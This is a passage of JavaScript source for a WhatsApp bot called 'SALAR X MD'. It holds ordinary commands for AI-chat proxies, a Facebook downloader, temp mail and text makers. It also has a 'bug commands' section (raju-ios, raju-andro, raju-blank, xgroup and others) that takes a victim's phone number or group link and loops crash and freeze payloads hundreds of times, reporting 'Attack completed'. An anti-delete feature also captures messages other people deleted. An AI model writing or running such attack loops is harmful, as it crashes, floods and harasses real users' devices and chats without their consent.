                    const res = await fetch(`https://apis.prexzyvilla.site/ai/grok?text=${encodeURIComponent(query)}`);
                    if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

                    const json = await res.json();
                    const answer = json?.data || "";

                    if (!answer) return reply("⚠️ *No response from Grok*");

                    const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];

                    for (let i = 0; i < chunks.length; i++) {
                        const header = i === 0 ? "🤖 *Grok*\n\n" : "";
                        await devtrust.sendMessage(chatId, addNewsletterContext({ text: header + chunks[i] }));
                    }
                } catch (err) {
                    console.error(err);
                    reply("⚠️ *Grok unavailable*");
                }
            }
                break;

            case 'stupidcheck': case 'uncleancheck': case 'hotcheck': case 'smartcheck':
            case 'greatcheck': case 'evilcheck': case 'dogcheck': case 'coolcheck':
            case 'gaycheck': case 'waifucheck': {
                const okebnh1 = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
                const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)];

                const msgs = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: xeonkak + "%"
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗'
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    hasMediaAttachment: false,
                                    ...await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.png') }, { upload: devtrust.waUploadToServer })
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [{
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{\"display_text\":\"✅\",\"id\":\"\"}`
                                    }],
                                }),
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    forwardingScore: 999,
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: NEWSLETTER_JID,
                                        newsletterName: NEWSLETTER_NAME,
                                        serverMessageId: -1
                                    }
                                }
                            })
                        }
                    }
                }, { quoted: m });

                return await devtrust.relayMessage(m.chat, msgs.message, {});
            }
                break;

            case "metabcn-ai": {
                const chatId = m.key.remoteJid;
                let query = args.join(" ").trim();

                try {
                    if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
                        const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
                        if (quoted.conversation) query = quoted.conversation;
                        else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
                    }

                    if (!query) return reply("🤖 *Usage:* meta your question");

                    const res = await fetch(`https://apis.prexzyvilla.site/ai/meta-ai?text=${encodeURIComponent(query)}`);
                    if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

                    const json = await res.json();
                    const answer = json?.data || "";

                    if (!answer) return reply("⚠️ *No response from Meta AI*");

                    const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];

                    for (let i = 0; i < chunks.length; i++) {
                        const header = i === 0 ? "🤖 *Meta AI*\n\n" : "";
                        await devtrust.sendMessage(chatId, addNewsletterContext({ text: header + chunks[i] }));
                    }
                } catch (err) {
                    console.error(err);
                    reply("⚠️ *Meta AI unavailable*");
                }
            }
                break;

            case "qwenxj": {
                const chatId = m.key.remoteJid;
                let query = args.join(" ").trim();

                try {
                    if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
                        const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
                        if (quoted.conversation) query = quoted.conversation;
                        else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
                    }

                    if (!query) return reply("🤖 *Usage:* qwen your question");

                    const res = await fetch(`https://apis.prexzyvilla.site/ai/qwen?text=${encodeURIComponent(query)}`);
                    if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

                    const json = await res.json();
                    const answer = json?.data || "";

                    if (!answer) return reply("⚠️ *No response from Qwen*");

                    const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];

                    for (let i = 0; i < chunks.length; i++) {
                        const header = i === 0 ? "🤖 *Qwen*\n\n" : "";
                        await devtrust.sendMessage(chatId, addNewsletterContext({ text: header + chunks[i] }));
                    }
                } catch (err) {
                    console.error(err);
                    reply("⚠️ *Qwen unavailable*");
                }
            }
                break;

case 'fb': {
    const fbUrl = args[0];

    if (!fbUrl || !/facebook\.com|fb\.watch/.test(fbUrl)) {
        return devtrust.sendMessage(m.chat, addNewsletterContext({
            text: '❌ *Invalid Facebook link*\n\nExample:\n*.fb* https://fb.watch/xxx'
        }), { quoted: m });
    }

    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const res  = await fetch(`https://api.theresav.biz.id/download/fb?url=${encodeURIComponent(fbUrl)}&apikey=GNaiK`);
        const json = await res.json();

        if (!json.status || !json.result || !json.result.links?.length) throw new Error('API returned no links');

        const result    = json.result;
        const title     = result.title || 'Facebook Video';
        const thumbnail = result.thumbnail || '';

        const hdLink   = result.links.find(l => l.type === 'mp4' && l.quality === 'HD');
        const sdLink   = result.links.find(l => l.type === 'mp4' && l.quality === 'SD');
        const audioLink = result.links.find(l => l.type === 'm4a');
        const videoLink = hdLink || sdLink;

        if (!videoLink) throw new Error('No MP4 link found');

        const hdUrl    = hdLink?.url    || null;
        const sdUrl    = sdLink?.url    || null;
        const hdSize   = hdLink?.size   || '-';
        const sdSize   = sdLink?.size   || '-';
        const audioUrl = audioLink?.url || null;

        const caption =
            `╭─❍「 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗗𝗟 」\n` +
            `│ 🎬 *Title* : ${title}\n` +
            `│ 📦 *Quality* : ${hdUrl && sdUrl ? 'HD & SD 🔥' : hdUrl ? 'HD Only' : 'SD Only'}\n` +
            `│ 🔥 *HD Size* : ${hdSize}\n` +
            `│ 💾 *SD Size* : ${sdSize}\n` +
            `│ ✓ *Status* : Success\n` +
            `╰───────────────`;

        const buttons = [
            {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({ display_text: '🔗 Open Facebook', url: fbUrl })
            },
            hdUrl && {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({ display_text: `⬇️ Download HD (${hdSize})`, url: hdUrl })
            },
            sdUrl && {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({ display_text: `⬇️ Download SD (${sdSize})`, url: sdUrl })
            },
            audioUrl && {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({ display_text: '🎵 Download Audio (M4A)', url: audioUrl })
            }
        ].filter(Boolean);

        const mediaContent = thumbnail
            ? await prepareWAMessageMedia({ image: { url: thumbnail } }, { upload: devtrust.waUploadToServer })
            : await prepareWAMessageMedia({ video: { url: videoLink.url } }, { upload: devtrust.waUploadToServer });

        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: { text: caption },
                        footer: { text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' },
                        header: {
                            hasMediaAttachment: true,
                            ...mediaContent
                        },
                        nativeFlowMessage: {
                            buttons: buttons.map(b =>
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create(b)
                            )
                        },
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            },
                            externalAdReply: {
                                title: '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                body: 'Facebook Downloader',
                                thumbnailUrl: thumbnail || '',
                                sourceUrl: fbUrl,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });

        await devtrust.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        const videoFetch  = await fetch(videoLink.url);
        if (!videoFetch.ok) throw new Error('Video fetch failed');
        const videoBuffer = Buffer.from(await videoFetch.arrayBuffer());

        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                video: videoBuffer,
                caption: `🎬 *${title}*\n© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗`,
                mimetype: 'video/mp4',
                fileName: `facebook_rajuxmd.mp4`
            }),
            { quoted: m }
        );

    } catch (err) {
        console.error('[FB DL]', err);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ *Download Failed*\n${err.message || 'Unknown error'}` }),
            { quoted: m }
        );
    }

    break;
}


// ======================[ ANTI-DELETE COMMAND ]======================

case 'antidelete-on': {
if (!isCreator) return reply('🔒 *Owner only*');
    let db = loadDeleteSession()
    let session = db.find(s => s.sesi === m.chat)

    if (session) {
        if (session.Aktif === 'yes') {
            return reply('⚠️ The Anti-Delete feature is already active in this chat.')
        }
        session.Aktif = 'yes'
    } else {
        db.push({
            sesi: m.chat,
            Aktif: 'yes',
            limit1000: []
        })
    }

    saveDeleteSession(db)
    invalidateDeleteSessionCache()
    global.antidelete[m.chat] = true

    let stats = typeof getAntiDeleteStats === 'function' ? getAntiDeleteStats() : null
    let successTxt = `╭─❍「 🗑️ *ANTI-DELETE ACTIVATED* 」\n` +
                     `│ 📊 *Target* : _${m.isGroup ? 'Group Chat' : 'Private Chat'}_\n` +
                     `│ ⚙️ *Engine* : _Database Sandbox v2.0_\n` +
                     `│ 📦 *Buffer Limit* : _1,000 Messages/Chat_\n` +
                     `${stats ? `│ 💾 *Storage Size* : _${stats.mediaSizeMB || '0 MB'}_\n` : ''}` +
                     `╰───────────────\n\n` +
                     `✅ System successfully locked. All messages deleted by others in this chat session will be automatically recorded and resent in real-time.`

    await devtrust.sendMessage(m.chat, { text: successTxt }, { quoted: m })
    break
}

case 'antidelete-off': {
if (!isCreator) return reply('🔒 *Owner only*');
    let db = loadDeleteSession()
    const sessionExists = db.some(s => s.sesi === m.chat && s.Aktif === 'yes')

    if (!sessionExists) {
        return reply('⚠️ Anti-Delete is already inactive in this chat.')
    }

    // Remove session from JSON entirely
    db = db.filter(s => s.sesi !== m.chat)
    saveDeleteSession(db)
    invalidateDeleteSessionCache()

    // Clear in-memory store for this chat
    global.antidelete[m.chat] = false
    for (const key of global.msgUpsertStore.keys()) {
        if (key.startsWith(m.chat)) global.msgUpsertStore.delete(key)
    }

    let deactTxt = `╭─❍「 🛑 *ANTI-DELETE DEACTIVATED* 」\n` +
                   `│ 📊 *Target* : _${m.isGroup ? 'Group Chat' : 'Private Chat'}_\n` +
                   `│ 🔓 *Status* : _Unmonitored_\n` +
                   `╰───────────────\n\n` +
                   `🛑 Monitoring system disabled. Messages deleted after this will no longer be recorded by the bot.`

    await devtrust.sendMessage(m.chat, { text: deactTxt }, { quoted: m })
    break
}


// ====================================================================


            // ============ TEMP MAIL COMMANDS ============
            case "tempmail":
            case "tmpmail":
            case "newmail": {
                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '📧', key: m.key } });

                    // Generate new email
                    const response = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
                    const email = response.data[0];

                    if (!email) return reply("❌ *Failed to generate email*");

                    // Store email for this user
                    tempMailData[m.sender] = {
                        email: email,
                        login: email.split('@')[0],
                        domain: email.split('@')[1],
                        createdAt: Date.now()
                    };

                    const message = `📧 *Temporary Email Created*\n\n` +
                        `📨 ${email}\n\n` +
                        `📌 *Commands:*\n` +
                        `• checkmail - Check inbox\n` +
                        `• readmail [id] - Read specific email\n` +
                        `• delmail - Delete current email\n\n` +
                        `_Email expires in 24 hours_`;

                    reply(message);
                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Temp mail error:', error);
                    reply("❌ *Error creating temporary email*");
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                }
                break;
            }

            case "checkmail":
            case "checkmails":
            case "inbox": {
                const userMail = tempMailData[m.sender];
                if (!userMail || !userMail.email) {
                    return reply("❌ *No email found. Use `tempmail` first*");
                }

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '📬', key: m.key } });

                    const response = await axios.get(
                        `https://www.1secmail.com/api/v1/?action=getMessages&login=${userMail.login}&domain=${userMail.domain}`
                    );

                    const messages = response.data;

                    if (!messages || messages.length === 0) {
                        return reply(`📭 *Inbox Empty*\n\nYour inbox for ${userMail.email} has no messages.`);
                    }

                    let inboxText = `📬 *Inbox - ${userMail.email}*\n\n`;
                    inboxText += `Found ${messages.length} message(s):\n\n`;

                    messages.forEach((msg, index) => {
                        inboxText += `${index + 1}. 📧 *From:* ${msg.from}\n`;
                        inboxText += `   📅 *Date:* ${msg.date}\n`;
                        inboxText += `   📝 *Subject:* ${msg.subject}\n`;
                        inboxText += `   🆔 *ID:* ${msg.id}\n\n`;
                    });

                    inboxText += `_Use "readmail [id]" to read a message_`;

                    // Store messages for this user
                    tempMailData[m.sender].messages = messages;

                    reply(inboxText);
                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Check mail error:', error);
                    reply("❌ *Error checking inbox*");
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                }
                break;
            }

            case "readmail":
            case "reademail": {
                const userMail = tempMailData[m.sender];
                if (!userMail || !userMail.email) {
                    return reply("❌ *No email found. Use `tempmail` first*");
                }

                const messageId = args[0];
                if (!messageId) {
                    return reply("❌ *Please provide a message ID*\nExample: readmail 123456");
                }

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '📖', key: m.key } });

                    const response = await axios.get(
                        `https://www.1secmail.com/api/v1/?action=readMessage&login=${userMail.login}&domain=${userMail.domain}&id=${messageId}`
                    );

                    const message = response.data;

                    if (!message || !message.id) {
                        return reply(`❌ *Message with ID ${messageId} not found*`);
                    }

                    let messageText = `📧 *Email Details*\n\n`;
                    messageText += `*From:* ${message.from}\n`;
                    messageText += `*Date:* ${message.date}\n`;
                    messageText += `*Subject:* ${message.subject}\n\n`;

                    if (message.textBody) {
                        messageText += `*Content:*\n${message.textBody.substring(0, 1000)}`;
                        if (message.textBody.length > 1000) messageText += `...\n\n_(Message truncated)_`;
                    } else if (message.htmlBody) {
                        messageText += `*Content:* [HTML Content - Cannot display]`;
                    } else {
                        messageText += `*Content:* No text content`;
                    }

                    // Check for attachments
                    if (message.attachments && message.attachments.length > 0) {
                        messageText += `\n\n*Attachments:* ${message.attachments.length}`;
                    }

                    reply(messageText);
                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Read mail error:', error);
                    reply("❌ *Error reading message*");
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                }
                break;
            }

            case "delmail":
            case "deletemail":
            case "deltemp":
            case "deltmp": {
                if (!tempMailData[m.sender]) {
                    return reply("❌ *No email to delete*");
                }

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '🗑️', key: m.key } });

                    const userMail = tempMailData[m.sender];

                    // Optional: Actually delete from 1secmail
                    if (userMail.login && userMail.domain) {
                        await axios.get(
                            `https://www.1secmail.com/api/v1/?action=deleteMailbox&login=${userMail.login}&domain=${userMail.domain}`
                        );
                    }

                    // Remove from local storage
                    delete tempMailData[m.sender];

                    reply("✅ *Temporary email deleted successfully*");
                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Delete mail error:', error);
                    // Still delete locally even if API fails
                    delete tempMailData[m.sender];
                    reply("✅ *Temporary email removed from local storage*");
                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                }
                break;
            }
            // ============================================

            case 'tempmail2': {
                try {
                    const res = await axios.get(`https://apis.HansTz.my.id/temp-mail`);
                    const data = res.data;

                    if (!data.success) return reply(`❌ *Failed to generate*`);

                    global.tempMailSession = data.session_id;

                    reply(`📧 *Temp Mail*\n\n` +
                        `Email: ${data.email}\n` +
                        `Session: ${data.session_id}\n\n` +
                        `Use *tempmail-inbox ${data.session_id}* to check`);
                } catch (err) {
                    console.error(err);
                    reply(`❌ *Error*`);
                }
            }
                break;

            case 'tempmail-inbox': {
                if (!args[0]) return reply(`❌ *Provide session ID*`);

                try {
                    const sessionId = args[0];
                    const res = await axios.get(`https://apis.HansTz.my.id/temp-mail/inbox?id=${sessionId}`);
                    const data = res.data;

                    if (!data.success) return reply(`❌ *Failed to fetch inbox*`);

                    if (data.messages.length === 0) return reply(`📭 *Inbox empty*`);

                    let inboxText = data.messages.map((msg, i) =>
                        `📧 *Message ${i + 1}*\n` +
                        `From: ${msg.fromAddr}\n` +
                        `To: ${msg.toAddr}\n` +
                        `Text: ${msg.text ? msg.text.substring(0, 200) + '...' : 'No preview'}`
                    ).join('\n\n');

                    reply(`📬 *Inbox*\n\n${inboxText}`);
                } catch (err) {
                    console.error(err);
                    reply(`❌ *Error*`);
                }
            }
                break;

            //==============================
            // 𝗖𝗔𝗦𝗘 𝗕𝗨𝗚 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦
            //==============================
case "raju-invis": {
    if (!isCreator) return reply('🔒 *Owner only*');

    if (!args[0]) {
        return reply(`📌 *Usage:* ${command} 923xx`);
    }

    // Get number & sanitize
    let pepec = (args[0] || "").replace(/[^0-9]/g, "");

    if (!pepec) {
        return reply("❌ *Invalid number*");
    }

    // 🔒 PROTECTED NUMBERS CHECK
    let protectedNumbers = ["13252318920"];
    if (protectedNumbers.includes(pepec)) {
        return reply("🔒 *Protected*");
    }

    let target = pepec + '@s.whatsapp.net';

    await reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);

    await doneress();

    for (let i = 0; i < 400; i++) {
     await rinvis(devtrust, target);
     await sleep (750);
     await isinvisr(devtrust, target);
     await sleep(750);
     await rajuinvdelay2(devtrust, target);
     await sleep(750);
     await rajudelayy(devtrust, target);
await sleep(750);
    }

    await devtrust.sendMessage(from, {
        react: { text: "🥶", key: m.key }
    });
}
break;

case "raju-fcnew": {
    if (!isCreator) return reply('🔒 *Owner only*');

    if (!args[0]) {
        return reply(`📌 *Usage:* ${command} 923xx`);
    }

    // Get number & sanitize
    let pepec = (args[0] || "").replace(/[^0-9]/g, "");

    if (!pepec) {
        return reply("❌ *Invalid number*");
    }

    // 🔒 PROTECTED NUMBERS CHECK
    let protectedNumbers = ["13252318920"];
    if (protectedNumbers.includes(pepec)) {
        return reply("🔒 *Protected*");
    }

    let target = pepec + '@s.whatsapp.net';

    await reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);

    await doneress();

    for (let i = 0; i < 400; i++) {
     await rajufcnew(target);
     await sleep(1600);
    }

    await devtrust.sendMessage(from, {
        react: { text: "🥶", key: m.key }
    });
}
break;

case "raju-bulldozer": {
    if (!isCreator) return reply('🔒 *Owner only*');

    if (!args[0]) {
        return reply(`📌 *Usage:* ${command} 923xx`);
    }

    // Get number & sanitize
    let pepec = (args[0] || "").replace(/[^0-9]/g, "");

    if (!pepec) {
        return reply("❌ *Invalid number*");
    }

    // 🔒 PROTECTED NUMBERS CHECK
    let protectedNumbers = ["13252318920"];
    if (protectedNumbers.includes(pepec)) {
        return reply("🔒 *Protected*");
    }

    let target = pepec + '@s.whatsapp.net';

    await reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);

    await doneress();

    for (let i = 0; i < 2; i++) {
     await CV10(devtrust, target);
await sleep(750);
    }

    await devtrust.sendMessage(from, {
        react: { text: "🥶", key: m.key }
    });
}
break;
               
case "raju-ios": {
  if (!isCreator) return reply('🔒 *Owner only*');
  if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

  let pepec = args[0].replace(/[^0-9]/g, "");

  let protectedNumbers = ["13252318920"];
  if (protectedNumbers.includes(pepec)) {
    return reply("🔒 *Protected*");
  }

  let target = pepec + '@s.whatsapp.net';
  reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n⚡ *Status: Processing...*`);

  try {
    await doneress();

    for (let i = 0; i < 500; i++) {
     await iosscrashinvs(devtrust, target);
     await sleep(750);
    }
    await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
    reply(`✅ *Attack completed on ${pepec}*`);
  } catch (err) {
    console.error(err);
    reply(`❌ *Error:* ${err.message || 'Unknown error'}`);
  }
  break;
}

case "raju-iosnew": {
  if (!isCreator) return reply('🔒 *Owner only*');
  if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

  let pepec = args[0].replace(/[^0-9]/g, "");

  let protectedNumbers = ["13252318920"];
  if (protectedNumbers.includes(pepec)) {
    return reply("🔒 *Protected*");
  }

  let target = pepec + '@s.whatsapp.net';
  reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n⚡ *Status: Processing...*`);

  try {
    await doneress();

    for (let i = 0; i < 400; i++) {
    await iosraajuuu(devtrust, target);
     await sleep(750);
    }
    await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
    reply(`✅ *Attack completed on ${pepec}*`);
  } catch (err) {
    console.error(err);
    reply(`❌ *Error:* ${err.message || 'Unknown error'}`);
  }
  break;
}

case "raju-blank": {
  if (!isCreator) return reply('🔒 *Owner only*');
  if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

  let pepec = args[0].replace(/[^0-9]/g, "");

  let protectedNumbers = ["13252318920"];
  if (protectedNumbers.includes(pepec)) {
    return reply("🔒 *Protected*");
  }

  let target = pepec + '@s.whatsapp.net';
  reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n⚡ *Status: Processing...*`);

  try {
    await doneress();

    for (let i = 0; i < 500; i++) {
     await rajublank(devtrust, target);
     await sleep(750);
     await isblankr(devtrust, target);
     await sleep(750);
    }
    await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
    reply(`✅ *Attack completed on ${pepec}*`);
  } catch (err) {
    console.error(err);
    reply(`❌ *Error:* ${err.message || 'Unknown error'}`);
  }
  break;
}

case "raju-visibale": {
  if (!isCreator) return reply('🔒 *Owner only*');
  if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

  let pepec = args[0].replace(/[^0-9]/g, "");

  let protectedNumbers = ["13252318920"];
  if (protectedNumbers.includes(pepec)) {
    return reply("🔒 *Protected*");
  }

  let target = pepec + '@s.whatsapp.net';
  reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n⚡ *Status: Processing...*`);

  try {
    await doneress();

    for (let i = 0; i < 500; i++) {
     await rajuvisible(devtrust, target);
     await sleep(750);
     await vcs(target);
     await sleep(750);
    }
    await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
    reply(`✅ *Attack completed on ${pepec}*`);
  } catch (err) {
    console.error(err);
    reply(`❌ *Error:* ${err.message || 'Unknown error'}`);
  }
  break;
}

case "raju-delay": {
  if (!isCreator) return reply('🔒 *Owner only*');

  if (!args[0]) {
    return reply(`📌 *Usage:* ${command} 923xx`);
  }

  let pepec = (args[0] || "").replace(/[^0-9]/g, "");
  if (!pepec) return reply("❌ *Invalid number*");

  let protectedNumbers = ["13252318920"];
  if (protectedNumbers.includes(pepec)) {
    return reply("🔒 *Protected*");
  }

  let target = pepec + '@s.whatsapp.net';

  reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n⚡ *Status: Processing...*`);

  try {
    await doneress();
    await sleep(1000);

    for (let i = 0; i < 450; i++) {
      await crashdelayjirwow(devtrust, target);
      await sleep(750);
    }

    await devtrust.sendMessage(from, {
      react: { text: "🥶", key: m.key }
    });

    reply(`✅ *Attack completed on ${pepec}*`);

  } catch (err) {
    console.error(err);
    reply(`❌ *Error:* ${err.message || 'Unknown error'}`);
  }
  break;
}

case "raju-andro": {
  if (!isCreator) return reply('🔒 *Owner only*');

  if (!args[0]) {
    return reply(`📌 *Usage:* ${command} 923xx`);
  }

  let pepec = (args[0] || "").replace(/[^0-9]/g, "");
  if (!pepec) return reply("❌ *Invalid number*");

  let protectedNumbers = ["13252318920"];
  if (protectedNumbers.includes(pepec)) {
    return reply("🔒 *Protected*");
  }

  let target = pepec + '@s.whatsapp.net';

  reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n⚡ *Status: Processing...*`);

  try {
    await doneress();
    await sleep(1000);

    for (let i = 0; i < 200; i++) {
    await crashandrowoyyy(devtrust, target);
      await sleep(750);
    }

    await devtrust.sendMessage(from, {
      react: { text: "🥶", key: m.key }
    });

    reply(`✅ *Attack completed on ${pepec}*`);

  } catch (err) {
    console.error(err);
    reply(`❌ *Error:* ${err.message || 'Unknown error'}`);
  }
  break;
}

            //====================[ GROUP BUG COMMANDS ]===========================//
case 'xgroup': {
  if (!isOwner) return reply('🔒 Owner only');

  const text = args[0];
  let target = null;
  let groupLink = text;

  // ✅ kalau di group
  if (m.isGroup) {
    target = m.chat;
  }

  // ✅ kalau pakai link
  if (!target && text && text.includes('chat.whatsapp.com')) {
    try {
      const code = text.split('chat.whatsapp.com/')[1];
      const res = await devtrust.groupAcceptInvite(code);

      target = res;

      await devtrust.sendMessage(m.chat, addNewsletterContext({
        text: '✅ Successfully joined the group!'
      }), { quoted: m });

    } catch (err) {
      return devtrust.sendMessage(m.chat, addNewsletterContext({
        text: '❌ Failed to join group.'
      }), { quoted: m });
    }
  }

  // ❌ kalau kosong
  if (!target) {
    return devtrust.sendMessage(m.chat, addNewsletterContext({
      text: '⚠️ Use inside group or provide link.'
    }), { quoted: m });
  }

  // 💎 BUTTON (ADA LINK GROUP)
  const buttons = [
    groupLink && groupLink.includes('chat.whatsapp.com') && {
      name: "cta_url",
      buttonParamsJson: JSON.stringify({
        display_text: "🔗 Open Group Link",
        url: groupLink
      })
    },
    {
      name: "cta_url",
      buttonParamsJson: JSON.stringify({
        display_text: "📢 Channel",
        url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
      })
    }
  ].filter(Boolean);

  const caption = `╭─❍「 GROUP SENDER 」
│ 📍 Target : ${target}
│ ⚙️ Mode : Repeat
│ ✓ Status : Running
╰───────────────`;

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({

          body: { text: caption },

          footer: { text: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗" },

          header: {
            title: "⚙️ Group Sender",
            hasMediaAttachment: false
          },

          nativeFlowMessage: {
            buttons: buttons.map(b =>
              proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create(b)
            )
          }

        })
      }
    }
  }, { quoted: m, userJid: devtrust.user.jid });

  await devtrust.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });

for (let i = 0; i < 400; i++) {
await Rajufcrich(devtrust, target);
await sleep(750);
                    await rajugb(devtrust, target);
                    await sleep(750);
                    await BlankFreezeChatGroup(devtrust, target);
                    await sleep(750);
                }

  await devtrust.sendMessage(m.chat, addNewsletterContext({
    text: '✅ Done.'
  }), { quoted: m });

  break;
}


            // ✨ TEXT MAKER COMMANDS

            case "glitchtext": {
                if (args.length < 1) return reply("✏️ *Usage:* glitchtext 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑");

                try {
                    let url = `https://apis.prexzyvilla.site/glitchtext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "⚡ *Glitch Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "writetext": {
                if (args.length < 1) return reply("✏️ *Usage:* writetext 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑");

                try {
                    let url = `https://apis.prexzyvilla.site/writetext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "✍️ *Write Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "advancedglow": {
                if (args.length < 1) return reply("✏️ *Usage:* advancedglow 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑");

                try {
                    let url = `https://apis.prexzyvilla.site/advancedglow?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "💡 *Advanced Glow*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "typographytext": {
                if (args.length < 1) return reply("✏️ *Usage:* typographytext 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑");

                try {
                    let url = `https://apis.prexzyvilla.site/typographytext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🖋️ *Typography*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "pixelglitch": {
                if (args.length < 1) return reply("✏️ *Usage:* pixelglitch 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑");

                try {
                    let url = `https://apis.prexzyvilla.site/pixelglitch?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🧩 *Pixel Glitch*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
